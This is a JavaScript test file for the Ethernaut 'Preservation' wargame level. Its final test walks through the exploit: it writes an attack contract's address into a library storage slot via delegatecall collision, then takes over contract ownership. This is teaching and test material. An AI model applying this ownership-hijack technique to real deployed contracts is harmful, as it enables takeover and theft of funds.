const PreservationFactory = artifacts.require('./levels/PreservationFactory.sol')
const Preservation = artifacts.require('./levels/Preservation.sol')
const PreservationAttack = artifacts.require('./attacks/PreservationAttack.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')
const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')


contract('Preservation', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]
  let instance = undefined

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await PreservationFactory.new()
    await ethernaut.registerLevel(level.address)
    instance = await utils.createLevelInstance(ethernaut, level.address, player, Preservation);
  });

  it('should not be immediately solveable', async function() {

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, false);
  });

  it('the second function should always be able to modify state, regardless of user input', async function() {
    // send some random times
    await instance.setFirstTime(26)
    await instance.setSecondTime(1e20.toString())

    // the second should be fine 
    let firstLibraryAddress = await instance.timeZone1Library.call()
    await instance.setSecondTime(1)
    let adjustedAddress = await instance.timeZone1Library.call()
    assert(firstLibraryAddress != adjustedAddress)
    assert.equal(adjustedAddress, 1)
  })

  it('the level should be solveable', async function() {
   
    const AttackContract = await PreservationAttack.new(); 
    // convert the address to a uint 
    let attackAddressNumber = new BN(AttackContract.address,16); 
    // set the attack contract as the first time library
    await instance.setSecondTime(attackAddressNumber)
    // set the player address to an integer 
    let playerAddressNumber = new BN(player,16);  
    // set the player as the owner
    await instance.setFirstTime(playerAddressNumber)

    // Player should own the instance now
    owner = await instance.owner.call()
    assert.equal(owner, player)

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });

});
